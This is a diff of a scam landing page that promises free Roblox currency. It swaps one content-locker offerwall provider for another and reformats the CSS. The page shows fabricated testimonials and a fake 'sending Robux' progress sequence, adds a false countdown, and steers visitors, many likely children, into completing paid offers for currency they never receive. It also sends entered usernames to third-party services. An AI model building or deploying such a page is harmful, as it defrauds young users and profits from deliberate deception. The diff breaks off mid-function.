@@ -17,7 +17,7 @@ You can take this landing page but leave this message or website will be taken d
     <style>
       body {
         font-family: "Poppins", sans-serif;
-        background: #f1f1f1; /* Plain white background */
+        background: #f1f1f1;
         margin: 0;
         padding: 0;
         display: flex;
@@ -29,7 +29,6 @@ You can take this landing page but leave this message or website will be taken d
         overflow-y: auto;
       }
 
-      /* Testimonials Carousel Styles */
       .testimonial-carousel-container {
         width: 100%;
         max-width: 500px;
@@ -122,7 +121,6 @@ You can take this landing page but leave this message or website will be taken d
         background-color: #ff3e3e;
       }
 
-      /* Carousel Navigation Arrows */
       .carousel-arrow {
         position: absolute;
         top: 50%;
@@ -155,8 +153,6 @@ You can take this landing page but leave this message or website will be taken d
         right: 10px;
       }
 
-      /* Navigation Bar Styles - removed */
-
       .container {
         background-color: white;
         border-radius: 15px;
@@ -175,15 +171,9 @@ You can take this landing page but leave this message or website will be taken d
         animation: pulse 2s infinite;
       }
       @keyframes pulse {
-        0% {
-          transform: scale(1);
-        }
-        50% {
-          transform: scale(1.05);
-        }
-        100% {
-          transform: scale(1);
-        }
+        0% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+        100% { transform: scale(1); }
       }
       .logo {
         width: 150px;
@@ -192,12 +182,8 @@ You can take this landing page but leave this message or website will be taken d
         animation: rotate 30s linear infinite;
       }
       @keyframes rotate {
-        from {
-          transform: rotateY(0deg);
-        }
-        to {
-          transform: rotateY(360deg);
-        }
+        from { transform: rotateY(0deg); }
+        to { transform: rotateY(360deg); }
       }
       .input-field {
         width: 100%;
@@ -243,23 +229,9 @@ You can take this landing page but leave this message or website will be taken d
         animation: fadeIn 0.5s;
       }
       @keyframes fadeIn {
-        from {
-          opacity: 0;
-          transform: translateY(20px);
-        }
-        to {
-          opacity: 1;
-          transform: translateY(0);
-        }
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
       }
-      .divider {
-        margin: 30px 0;
-        height: 3px;
-        background: linear-gradient(to right, #4a00e0, #8e2de2, #ff3e3e);
-        border: none;
-        border-radius: 3px;
-      }
-      /* Loading spinner */
       .loader-container {
         margin: 30px auto;
         text-align: center;
@@ -274,12 +246,8 @@ You can take this landing page but leave this message or website will be taken d
         animation: spin 1.5s linear infinite;
       }
       @keyframes spin {
-        0% {
-          transform: rotate(0deg);
-        }
-        100% {
-          transform: rotate(360deg);
-        }
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
       }
       .loader-text {
         color: #4a00e0;
@@ -289,15 +257,9 @@ You can take this landing page but leave this message or website will be taken d
         animation: blink 1.5s infinite;
       }
       @keyframes blink {
-        0% {
-          opacity: 1;
-        }
-        50% {
-          opacity: 0.5;
-        }
-        100% {
-          opacity: 1;
-        }
+        0% { opacity: 1; }
+        50% { opacity: 0.5; }
+        100% { opacity: 1; }
       }
       #confirm-username {
         color: #4a00e0;
@@ -308,13 +270,6 @@ You can take this landing page but leave this message or website will be taken d
         border-radius: 10px;
         box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         display: inline-block;
-      }
-      .disclaimer {
-        margin-top: 25px;
-        color: #ff3e3e;
-        font-size: 14px;
-        font-weight: 600;
-        letter-spacing: 0.5px;
       }
       .robux-selection {
         display: flex;
@@ -409,82 +364,18 @@ You can take this landing page but leave this message or website will be taken d
         min-width: 250px;
         transform: translateX(400px);
         opacity: 0;
-        animation: notificationSlideIn 0.5s forwards,
-          notificationSlideOut 0.5s 5s forwards;
+        animation: notificationSlideIn 0.5s forwards, notificationSlideOut 0.5s 5s forwards;
       }
       @keyframes notificationSlideIn {
-        from {
-          transform: translateX(400px);
-          opacity: 0;
-        }
-        to {
-          transform: translateX(0);
-          opacity: 1;
-        }
+        from { transform: translateX(400px); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
       }
       @keyframes notificationSlideOut {
-        from {
-          transform: translateX(0);
-          opacity: 1;
-        }
-        to {
-          transform: translateX(400px);
-          opacity: 0;
-        }
+        from { transform: translateX(0); opacity: 1; }
+        to { transform: translateX(400px); opacity: 0; }
       }
-      .payout-username {
-        font-weight: 500;
-      }
-      .payout-amount {
-        color: #ff3e3e;
-        font-weight: bold;
-        margin-left: 15px;
-      }
-      .testimonials {
-        margin: 30px 0;
-        text-align: left;
-      }
-      .testimonial {
-        background-color: #f9f9f9;
-        border-radius: 10px;
-        padding: 15px;
-        margin-bottom: 15px;
-        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
-      }
-      .testimonial-header {
-        display: flex;
-        align-items: center;
-        margin-bottom: 10px;
-      }
-      .testimonial-avatar {
-        width: 40px;
-        height: 40px;
-        border-radius: 50%;
-        margin-right: 10px;
-        background-color: #eee;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        font-weight: bold;
-        color: #4a00e0;
-      }
-      .testimonial-name {
-        font-weight: 600;
-        color: #333;
-      }
-      .testimonial-date {
-        font-size: 12px;
-        color: #999;
-        margin-left: auto;
-      }
-      .testimonial-text {
-        font-size: 14px;
-        line-height: 1.5;
-      }
-      .testimonial-stars {
-        color: #ffd700;
-        margin-top: 5px;
-      }
+      .payout-username { font-weight: 500; }
+      .payout-amount { color: #ff3e3e; font-weight: bold; margin-left: 15px; }
       .loading-step {
         display: flex;
         align-items: center;
@@ -493,16 +384,9 @@ You can take this landing page but leave this message or website will be taken d
         transform: translateX(-20px);
         transition: all 0.5s;
       }
-      .loading-step.active {
-        opacity: 1;
-        transform: translateX(0);
-      }
-      .loading-step.completed .step-indicator {
-        background-color: #4caf50;
-      }
-      .loading-step.completed .step-text {
-        color: #4caf50;
-      }
+      .loading-step.active { opacity: 1; transform: translateX(0); }
+      .loading-step.completed .step-indicator { background-color: #4caf50; }
+      .loading-step.completed .step-text { color: #4caf50; }
       .step-indicator {
         width: 30px;
         height: 30px;
@@ -514,99 +398,10 @@ You can take this landing page but leave this message or website will be taken d
         align-items: center;
         transition: background-color 0.3s;
       }
-      .step-text {
-        font-weight: 500;
-        transition: color 0.3s;
-      }
-      .step-status {
-        margin-left: auto;
-        font-weight: 600;
-        opacity: 0;
-        transition: opacity 0.3s;
-      }
-      .loading-step.completed .step-status {
-        opacity: 1;
-      }
-      .final-message {
-        background-color: #f0f7ff;
-        border-radius: 10px;
-        padding: 20px;
-        margin: 20px 0;
-        border-left: 5px solid #4a00e0;
-      }
-      .sponsor-message {
-        font-size: 18px;
-        font-weight: 500;
-        margin-bottom: 15px;
-      }
-
-      /* New styles for offers section */
-      .offers-container {
-        margin-top: 25px;
-        padding: 20px;
-        background: linear-gradient(145deg, #f6f9ff, #edf5ff);
-        border-radius: 15px;
-        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
-      }
-
-      .offers-header {
-        font-size: 22px;
-        font-weight: 700;
-        color: #4a00e0;
-        margin-bottom: 15px;
-        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-      }
-
-      .offers-subheader {
-        font-size: 16px;
-        color: #555;
-        margin-bottom: 20px;
-        line-height: 1.5;
-      }
-
-      .offer-highlight {
-        color: #ff3e3e;
-        font-weight: 700;
-      }
-
-      .offers-note {
-        font-size: 14px;
-        color: #666;
-        font-style: italic;
-        margin-top: 15px;
-      }
-
-      .offers-timer {
-        display: inline-block;
-        background-color: #ff3e3e;
-        color: white;
-        font-weight: bold;
-        padding: 5px 10px;
-        border-radius: 5px;
-        margin: 15px 0;
-        animation: pulse 1.5s infinite;
-      }
-
-      .offer-btn-container {
-        margin: 25px 0 15px;
-      }
-
-      /* Animation for the offers section */
-      .animate-offers {
-        animation: slideUpFade 0.8s ease-out;
-      }
-
-      @keyframes slideUpFade {
-        0% {
-          opacity: 0;
-          transform: translateY(30px);
-        }
-        100% {
-          opacity: 1;
-          transform: translateY(0);
-        }
-      }
-      /* Enhanced Offers Section Styling */
+      .step-text { font-weight: 500; transition: color 0.3s; }
+      .step-status { margin-left: auto; font-weight: 600; opacity: 0; transition: opacity 0.3s; }
+      .loading-step.completed .step-status { opacity: 1; }
+      
       .offers-container {
         margin-top: 30px;
         padding: 25px;
@@ -616,246 +411,40 @@ You can take this landing page but leave this message or website will be taken d
         position: relative;
         overflow: hidden;
       }
-
       .offers-container::before {
         content: "";
         position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 5px;
+        top: 0; left: 0; width: 100%; height: 5px;
         background: linear-gradient(to right, #4a00e0, #8e2de2, #ff3e3e);
       }
-
-      .offers-header {
-        font-size: 24px;
-        font-weight: 700;
-        color: #4a00e0;
-        margin-bottom: 15px;
-        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-        letter-spacing: 0.5px;
-      }
-
-      .offers-subheader {
-        font-size: 16px;
-        color: #555;
-        margin-bottom: 20px;
-        line-height: 1.6;
-      }
-
-      .offer-highlight {
-        color: #ff3e3e;
-        font-weight: 700;
-        position: relative;
-        padding: 0 3px;
-      }
-
+      .offers-header { font-size: 24px; font-weight: 700; color: #4a00e0; margin-bottom: 15px; }
+      .offers-subheader { font-size: 16px; color: #555; margin-bottom: 20px; line-height: 1.6; }
+      .offer-highlight { color: #ff3e3e; font-weight: 700; position: relative; padding: 0 3px; }
       .offer-highlight::after {
-        content: "";
-        position: absolute;
-        bottom: -2px;
-        left: 0;
-        width: 100%;
-        height: 2px;
-        background: linear-gradient(to right, #ff3e3e, #ff8700);
-        border-radius: 2px;
+        content: ""; position: absolute; bottom: -2px; left: 0; width: 100%; height: 2px;
+        background: linear-gradient(to right, #ff3e3e, #ff8700); border-radius: 2px;
       }
-
-      .offers-note {
-        font-size: 14px;
-        color: #666;
-        font-style: italic;
-        margin-top: 15px;
-        position: relative;
-        padding-left: 20px;
-      }
-
-      .offers-note::before {
-        content: "⚠️";
-        position: absolute;
-        left: 0;
-        top: 0;
-      }
-
+      .offers-note { font-size: 14px; color: #666; font-style: italic; margin-top: 15px; position: relative; padding-left: 20px; }
+      .offers-note::before { content: "⚠️"; position: absolute; left: 0; top: 0; }
       .offers-timer {
-        display: inline-block;
-        background: linear-gradient(to right, #ff3e3e, #ff8700);
-        color: white;
-        font-weight: bold;
-        padding: 8px 15px;
-        border-radius: 8px;
-        margin: 20px 0;
-        box-shadow: 0 4px 8px rgba(255, 62, 62, 0.3);
-        animation: pulse 1.5s infinite;
-        position: relative;
+        display: inline-block; background: linear-gradient(to right, #ff3e3e, #ff8700);
+        color: white; font-weight: bold; padding: 8px 15px; border-radius: 8px; margin: 20px 0;
+        box-shadow: 0 4px 8px rgba(255, 62, 62, 0.3); animation: pulse 1.5s infinite; position: relative;
       }
-
-      .offers-timer::before {
-        content: "⏱️";
-        margin-right: 8px;
-      }
-
-      .offer-btn-container {
-        margin: 25px 0 15px;
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-        gap: 15px;
-      }
-
-      .offer-btn {
-        position: relative;
-        background: linear-gradient(to right, #4a00e0, #8e2de2);
-        color: white;
-        border: none;
-        border-radius: 10px;
-        padding: 15px 20px;
-        font-size: 16px;
-        font-weight: 600;
-        cursor: pointer;
-        transition: all 0.3s;
-        box-shadow: 0 4px 10px rgba(74, 0, 224, 0.3);
-        text-align: center;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        overflow: hidden;
-      }
-
-      .offer-btn:hover {
-        transform: translateY(-5px);
-        box-shadow: 0 8px 20px rgba(74, 0, 224, 0.4);
-      }
-
-      .offer-btn:active {
-        transform: translateY(-2px);
-      }
-
-      .offer-btn-alt {
-        background: linear-gradient(to right, #ff3e3e, #ff8700);
-        box-shadow: 0 4px 10px rgba(255, 62, 62, 0.3);
-      }
-
-      .offer-btn-alt:hover {
-        box-shadow: 0 8px 20px rgba(255, 62, 62, 0.4);
-      }
-
-      .offer-icon {
-        font-size: 24px;
-        margin-bottom: 10px;
-      }
-
-      .offer-title {
-        font-weight: 700;
-        margin-bottom: 5px;
-        font-size: 18px;
-      }
-
-      .offer-description {
-        font-size: 14px;
-        opacity: 0.9;
-      }
-
-      .offer-badge {
-        position: absolute;
-        top: -8px;
-        right: -8px;
-        background: linear-gradient(to right, #ff3e3e, #ff8700);
-        color: white;
-        font-size: 12px;
-        font-weight: bold;
-        padding: 4px 8px;
-        border-radius: 12px;
-        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-        transform: rotate(5deg);
-        z-index: 1;
-      }
-
-      /* Animation for offers */
-      .animate-offers {
-        animation: slideUpFade 0.8s ease-out;
-      }
-
-      @keyframes slideUpFade {
-        0% {
-          opacity: 0;
-          transform: translateY(30px);
-        }
-        100% {
-          opacity: 1;
-          transform: translateY(0);
-        }
-      }
-
-      /* Offer shine effect */
-      .offer-btn::after {
-        content: "";
-        position: absolute;
-        top: -50%;
-        left: -50%;
-        width: 200%;
-        height: 200%;
-        background: linear-gradient(
-          to right,
-          rgba(255, 255, 255, 0) 0%,
-          rgba(255, 255, 255, 0.3) 50%,
-          rgba(255, 255, 255, 0) 100%
-        );
-        transform: rotate(30deg);
-        transition: all 0.6s;
-        opacity: 0;
-      }
-
-      /* Styles for offer API integration */
-      .offer__item {
-        margin-bottom: 15px;
-        width: 100%;
-      }
-
-      .offer__btn {
-        display: block;
-        background: linear-gradient(to right, #4a00e0, #8e2de2);
-        color: white;
-        border: none;
-        border-radius: 10px;
-        padding: 15px 20px;
-        font-size: 16px;
-        font-weight: 600;
-        cursor: pointer;
-        transition: all 0.3s;
-        box-shadow: 0 4px 10px rgba(74, 0, 224, 0.3);
-        text-align: center;
-        text-decoration: none;
-        margin-bottom: 10px;
-      }
-
-      .offer__btn:hover {
-        transform: translateY(-5px);
-        box-shadow: 0 8px 20px rgba(74, 0, 224, 0.4);
-      }
-
-      .offer__btn:nth-child(odd) {
-        background: linear-gradient(to right, #ff3e3e, #ff8700);
-        box-shadow: 0 4px 10px rgba(255, 62, 62, 0.3);
-      }
-
-      .offer__btn:nth-child(odd):hover {
-        box-shadow: 0 8px 20px rgba(255, 62, 62, 0.4);
-      }
+      .offers-timer::before { content: "⏱️"; margin-right: 8px; }
     </style>
-      <script type="text/javascript">
+    <script type="text/javascript">
       var nPRaT_VPA_kWHJBc={"it":4595455,"key":"d30d6"};
     </script>
-    <!-- Fallback wrapper for the offerwall function (creates a safe fallback only if embed hasn't defined it) -->
+    <!-- Fallback wrapper for the offerwall function -->
     <script>
       (function () {
-        var offerId = "6ab7091a521d193660775d73";
+        var offerId = "69d9ef82e3605d1954a56ba0";
         var fnName = "openOfferwall_" + offerId;
 
-        // Define a non-destructive fallback only if the embed hasn't defined the function
         if (typeof window[fnName] !== "function") {
           window[fnName] = function () {
             try {
-              // Try common provider entry points if available
               if (window.Taprain && typeof window.Taprain.open === "function") {
                 return window.Taprain.open(offerId);
               }
@@ -865,17 +454,15 @@ You can take this landing page but leave this message or website will be taken d
             } catch (e) {
               console.warn("Offerwall provider call failed:", e);
             }
-            // Final fallback: inform the user
             alert("Offerwall is not ready yet. Please try again in a moment.");
           };
         }
       })();
     </script>
-    <!-- Taprain / locker embed (offerwall) - UPDATED TO WALLTRKS.COM -->
-    <script src="https://walltrks.com/locker-embed.js" data-offerwall-id="6ab7091a521d193660775d73"></script>
+    <!-- Trackora locker embed -->
+    <script src="https://nvdshbtpmeji.trackora.link/embed/locker.js" data-locker="nvdshbtpmeji" data-src="https://nvdshbtpmeji.trackora.link/" async></script>
   </head>
   <body>
-    <!-- Navigation bar removed -->
     <div class="container">
       <div class="last-updated"><span id="current-date"></span></div>
       <img
@@ -896,67 +483,37 @@ You can take this landing page but leave this message or website will be taken d
 
         <!-- Testimonial Carousel -->
         <div class="testimonial-carousel-container">
-          <!-- Left arrow navigation -->
-          <div
-            class="carousel-arrow carousel-arrow-left"
-            onclick="navigateCarousel(-1)"
-          >
-            &#10094;
-          </div>
-
+          <div class="carousel-arrow carousel-arrow-left" onclick="navigateCarousel(-1)">&#10094;</div>
           <div class="testimonial-carousel" id="testimonial-carousel">
-            <!-- Slide 1 -->
             <div class="testimonial-slide">
               <div class="testimonial-content">
                 <div class="testimonial-avatar-large">JD</div>
                 <div class="testimonial-name-large">JackDaniel78</div>
                 <div class="testimonial-badge">Verified User</div>
                 <div class="testimonial-stars-large">★★★★★</div>
-                <div class="testimonial-text-large">
-                  "I got my 5,000 Robux instantly after verification! This
-                  actually works, definitely try it out!"
-                </div>
+                <div class="testimonial-text-large">"I got my 5,000 Robux instantly after verification! This actually works, definitely try it out!"</div>
               </div>
             </div>
-
-            <!-- Slide 2 -->
             <div class="testimonial-slide">
               <div class="testimonial-content">
                 <div class="testimonial-avatar-large">LP</div>
                 <div class="testimonial-name-large">LilyPad2010</div>
                 <div class="testimonial-badge">Verified User</div>
                 <div class="testimonial-stars-large">★★★★★</div>
-                <div class="testimonial-text-large">
-                  "At first I was skeptical but this is legit. Just completed
-                  the verification and got my 10,000 Robux!"
-                </div>
+                <div class="testimonial-text-large">"At first I was skeptical but this is legit. Just completed the verification and got my 10,000 Robux!"</div>
               </div>
             </div>
-
-            <!-- Slide 3 -->
             <div class="testimonial-slide">
               <div class="testimonial-content">
                 <div class="testimonial-avatar-large">RG</div>
                 <div class="testimonial-name-large">RobloxGamer99</div>
                 <div class="testimonial-badge">Verified User</div>
                 <div class="testimonial-stars-large">★★★★★</div>
-                <div class="testimonial-text-large">
-                  "Easy to complete and my robux arrived in less than 5 minutes
-                  after verification. Highly recommended!"
-                </div>
+                <div class="testimonial-text-large">"Easy to complete and my robux arrived in less than 5 minutes after verification. Highly recommended!"</div>
               </div>
             </div>
           </div>
-
-          <!-- Right arrow navigation -->
-          <div
-            class="carousel-arrow carousel-arrow-right"
-            onclick="navigateCarousel(1)"
-          >
-            &#10095;
-          </div>
-
-          <!-- Carousel dots -->
+          <div class="carousel-arrow carousel-arrow-right" onclick="navigateCarousel(1)">&#10095;</div>
           <div class="carousel-dots">
             <div class="carousel-dot active" onclick="moveToSlide(0)"></div>
             <div class="carousel-dot" onclick="moveToSlide(1)"></div>
@@ -966,76 +523,232 @@ You can take this landing page but leave this message or website will be taken d
       </div>
 
       <div id="confirmation" class="confirmation">
-        <div class="last-updated"><span id="current-date2"></span></div>
         <div class="profile-picture-container">
-          <img
-            id="profile-picture"
-            src="https://i.seadn.io/gae/1RV1gX0QqQXzoVZqQl0qjJLfGDVIcyrAautlACKDn0TztGYOJ_mKaTvLkiQn4DCELguAGwV8mUwLh6CAD0eYWY95LnC5yizzVWFWzQ?auto=format&dpr=1&w=1000"
-            alt="Roblox Profile Picture"
-            class="profile-picture"
-          />
-          <div id="profile-loading" class="profile-loading">
-            <div class="profile-spinner"></div>
-          </div>
+          <img id="profile-picture" src="https://i.seadn.io/gae/1RV1gX0QqQXzoVZqQl0qjJLfGDVIcyrAautlACKDn0TztGYOJ_mKaTvLkiQn4DCELguAGwV8mUwLh6CAD0eYWY95LnC5yizzVWFWzQ?auto=format&dpr=1&w=1000" alt="Roblox Profile Picture" class="profile-picture" />
+          <div id="profile-loading" class="profile-loading"><div class="profile-spinner"></div></div>
         </div>
         <p>Is this you?</p>
         <h3 id="confirm-username"></h3>
         <div class="yes-no-buttons">
           <button class="button" onclick="showRobuxSelection()">YES</button>
-          <button
-            class="button"
-            style="background: linear-gradient(to right, #ff3e3e, #c71585)"
-            onclick="goBack()"
-          >
-            NO
-          </button>
+          <button class="button" style="background: linear-gradient(to right, #ff3e3e, #c71585)" onclick="goBack()">NO</button>
         </div>
       </div>
 
       <div id="robux-selection" class="confirmation">
-        <div class="last-updated"><span id="current-date3"></span></div>
         <h2>Select Robux Amount:</h2>
         <div class="robux-selection">
-          <div class="robux-option" onclick="selectRobux(this, 1000)">
-            <img
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png"
-              alt="Robux Logo"
-              class="robux-option-logo"
-            />
-            <div class="robux-amount">1,000</div>
-          </div>
-          <div class="robux-option" onclick="selectRobux(this, 2500)">
-            <img
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png"
-              alt="Robux Logo"
-              class="robux-option-logo"
-            />
-            <div class="robux-amount">2,500</div>
-          </div>
-          <div class="robux-option" onclick="selectRobux(this, 5000)">
-            <img
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png"
-              alt="Robux Logo"
-              class="robux-option-logo"
-            />
-            <div class="robux-amount">5,000</div>
-          </div>
-          <div class="robux-option" onclick="selectRobux(this, 10000)">
-            <img
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png"
-              alt="Robux Logo"
-              class="robux-option-logo"
-            />
-            <div class="robux-amount">10,000</div>
-          </div>
-          <div class="robux-option" onclick="selectRobux(this, 15000)">
-            <img
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png"
-              alt="Robux Logo"
-              class="robux-option-logo"
-            />
-            <div class="robux-amount">15,000</div>
-          </div>
-          <div class="robux-option" onclick="selectRobux(this, 20000)">
-            <img
-              src="https://upload.wikimedia.org/wikipedia
+          <div class="robux-option" onclick="selectRobux(this, 1000)"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png" class="robux-option-logo" /><div class="robux-amount">1,000</div></div>
+          <div class="robux-option" onclick="selectRobux(this, 2500)"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png" class="robux-option-logo" /><div class="robux-amount">2,500</div></div>
+          <div class="robux-option" onclick="selectRobux(this, 5000)"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png" class="robux-option-logo" /><div class="robux-amount">5,000</div></div>
+          <div class="robux-option" onclick="selectRobux(this, 10000)"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png" class="robux-option-logo" /><div class="robux-amount">10,000</div></div>
+          <div class="robux-option" onclick="selectRobux(this, 15000)"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png" class="robux-option-logo" /><div class="robux-amount">15,000</div></div>
+          <div class="robux-option" onclick="selectRobux(this, 20000)"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Robux_2019_Logo_Black.svg/960px-Robux_2019_Logo_Black.svg.png" class="robux-option-logo" /><div class="robux-amount">20,000</div></div>
+        </div>
+        <button id="robux-next-button" class="button" style="opacity: 0.5; cursor: not-allowed" disabled>NEXT</button>
+      </div>
+
+      <div id="loading-section" class="confirmation">
+        <h2>Processing Your Request</h2>
+        <div class="loading-step" id="step1"><div class="step-indicator">1</div><div class="step-text">Detecting Device</div><div class="step-status"></div></div>
+        <div class="loading-step" id="step2"><div class="step-indicator">2</div><div class="step-text">Connecting to the Database</div><div class="step-status"></div></div>
+        <div class="loading-step" id="step3"><div class="step-indicator">3</div><div class="step-text">Sending <span id="robux-amount-text">0</span> Robux to <span id="username-text"></span></div><div class="step-status"></div></div>
+        <div class="loader-container" id="main-loader"><div class="loader"></div><div class="loader-text">Processing...</div></div>
+      </div>
+
+      <div id="final-step" class="confirmation">
+        <div class="offers-container animate-offers">
+          <h3 class="offers-header">ALMOST THERE!</h3>
+          <p class="offers-subheader">Complete <strong>ONE</strong> offer below to verify you're human and claim your <span class="offer-highlight"><span id="offers-robux-amount">0</span> Robux</span> now!</p>
+          <div class="offers-timer" id="offer-timer">05:00</div>
+          <p class="offers-note">Complete verification quickly before your Robux expires!</p>
+          <button onclick="openOfferwall_69d9ef82e3605d1954a56ba0({ s1: selectedUsername })" style="background-color: green; color: white; border: none; border-radius: 8px; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer;">Claim Robux</button>
+        </div>
+      </div>
+    </div>
+
+    <div id="notification-container"></div>
+
+    <!-- jQuery -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+
+    <!-- Lead checker script -->
+    <script type="text/javascript">
+      setInterval(checkLeads, 15000);
+      function checkLeads() {
+        $.getJSON("https://dbj3fg9om9jaj.cloudfront.net/public/external/check2.php?testing=0&callback=?", function (leads) {
+            var completed_leads = leads.length;
+            if (completed_leads) {
+              alert("Congratulations! Your Robux has been added to your account!");
+              window.location.href = "https://www.roblox.com/";
+            } else {
+              console.log("No leads were found");
+            }
+          }
+        );
+      }
+    </script>
+    <script>
+      let selectedUsername = "";
+      let selectedRobuxAmount = 0;
+
+      function checkUsername() {
+        const username = document.getElementById("username").value;
+        if (username.trim() !== "") {
+          selectedUsername = username;
+          document.getElementById("username-section").style.display = "none";
+          document.getElementById("confirmation").style.display = "block";
+          document.getElementById("confirm-username").innerText = username;
+          fetchProfilePicture(username);
+        } else {
+          alert("Please enter your Roblox username");
+        }
+      }
+
+      async function fetchProfilePicture(username) {
+        document.getElementById("profile-loading").style.display = "flex";
+        try {
+          const apiUrl = `https://abadaoucht.com/tiktok/api/roblox/userinfo/${encodeURIComponent(username)}`;
+          const response = await fetch(apiUrl);
+          const userData = await response.json();
+          if (userData && userData.avatar) {
+            document.getElementById("profile-picture").src = userData.avatar;
+          } else {
+            document.getElementById("profile-picture").src = "https://i.seadn.io/gae/1RV1gX0QqQXzoVZqQl0qjJLfGDVIcyrAautlACKDn0TztGYOJ_mKaTvLkiQn4DCELguAGwV8mUwLh6CAD0eYWY95LnC5yizzVWFWzQ?auto=format&dpr=1&w=1000";
+          }
+        } catch (error) {
+          document.getElementById("profile-picture").src = "https://i.seadn.io/gae/1RV1gX0QqQXzoVZqQl0qjJLfGDVIcyrAautlACKDn0TztGYOJ_mKaTvLkiQn4DCELguAGwV8mUwLh6CAD0eYWY95LnC5yizzVWFWzQ?auto=format&dpr=1&w=1000";
+        } finally {
+          document.getElementById("profile-loading").style.display = "none";
+        }
+      }
+
+      function goBack() {
+        document.getElementById("username-section").style.display = "block";
+        document.getElementById("confirmation").style.display = "none";
+      }
+
+      function showRobuxSelection() {
+        document.getElementById("confirmation").style.display = "none";
+        document.getElementById("robux-selection").style.display = "block";
+      }
+
+      function selectRobux(element, amount) {
+        document.querySelectorAll(".robux-option").forEach((option) => option.classList.remove("selected"));
+        element.classList.add("selected");
+        selectedRobuxAmount = amount;
+        const nextButton = document.getElementById("robux-next-button");
+        nextButton.style.opacity = "1";
+        nextButton.style.cursor = "pointer";
+        nextButton.disabled = false;
+        nextButton.onclick = showLoadingProcess;
+      }
+
+      function showLoadingProcess() {
+        document.getElementById("robux-selection").style.display = "none";
+        document.getElementById("loading-section").style.display = "block";
+        document.getElementById("username-text").textContent = selectedUsername;
+        document.getElementById("robux-amount-text").textContent = selectedRobuxAmount.toLocaleString();
+        startLoadingSequence();
+      }
+
+      function startLoadingSequence() {
+        setTimeout(() => {
+          const step1 = document.getElementById("step1");
+          step1.classList.add("active");
+          setTimeout(() => {
+            step1.classList.add("completed");
+            step1.querySelector(".step-status").textContent = "Computer detected";
+            setTimeout(() => {
+              const step2 = document.getElementById("step2");
+              step2.classList.add("active");
+              setTimeout(() => {
+                step2.classList.add("completed");
+                step2.querySelector(".step-status").textContent = "Connected";
+                setTimeout(() => {
+                  const step3 = document.getElementById("step3");
+                  step3.classList.add("active");
+                  setTimeout(() => {
+                    step3.classList.add("completed");
+                    step3.querySelector(".step-status").textContent = "Ready";
+                    document.getElementById("main-loader").style.display = "none";
+                    setTimeout(showFinalStep, 1000);
+                  }, 2500);
+                }, 500);
+              }, 2000);
+            }, 500);
+          }, 1500);
+        }, 500);
+      }
+
+      function showFinalStep() {
+        document.getElementById("loading-section").style.display = "none";
+        document.getElementById("offers-robux-amount").textContent = selectedRobuxAmount.toLocaleString();
+        document.getElementById("final-step").style.display = "block";
+        startCountdownTimer();
+        
+        // This automatically opens the offerwall and passes the username
+        setTimeout(function () {
+          try {
+            if (typeof openOfferwall_69d9ef82e3605d1954a56ba0 === "function") {
+              openOfferwall_69d9ef82e3605d1954a56ba0({ s1: selectedUsername });
+            } else {
+              console.warn("Offerwall function not ready yet.");
+            }
+          } catch (e) {
+            console.warn("Error calling offerwall function:", e);
+          }
+        }, 2500);
+      }
+
+      function startCountdownTimer() {
+        let duration = 5 * 60;
+        const timerElement = document.getElementById("offer-timer");
+        const timer = setInterval(function () {
+          const minutes = Math.floor(duration / 60);
+          let seconds = duration % 60;
+          seconds = seconds < 10 ? "0" + seconds : seconds;
+          timerElement.textContent = minutes + ":" + seconds;
+          if (--duration < 0) {
+            clearInterval(timer);
+            timerElement.textContent = "EXPIRED";
+            timerElement.style.backgroundColor = "#999";
+          }
+        }, 1000);
+      }
+
+      function generateRandomUsername() {
+        const prefixes = ["Cool","Epic","Super","Amazing","Pro","Mega","Ultra","Extreme","Master","Legend","Ninja","Gamer","Roblox","Awesome","Shadow"];
+        const suffixes = ["Player","Gamer","Kid","Master","Pro","Expert","God","Boy","Girl","Warrior","Knight","Slayer","Builder","Creator"];
+        return prefixes[Math.floor(Math.random() * prefixes.length)] + suffixes[Math.floor(Math.random() * suffixes.length)] + Math.floor(Math.random() * 1000);
+      }
+
+      function generateRandomRobuxAmount() {
+        const amounts = [1000, 2500, 5000, 10000, 15000, 20000];
+        return amounts[Math.floor(Math.random() * amounts.length)];
+      }
+
+      function showNotification() {
+        const container = document.getElementById("notification-container");
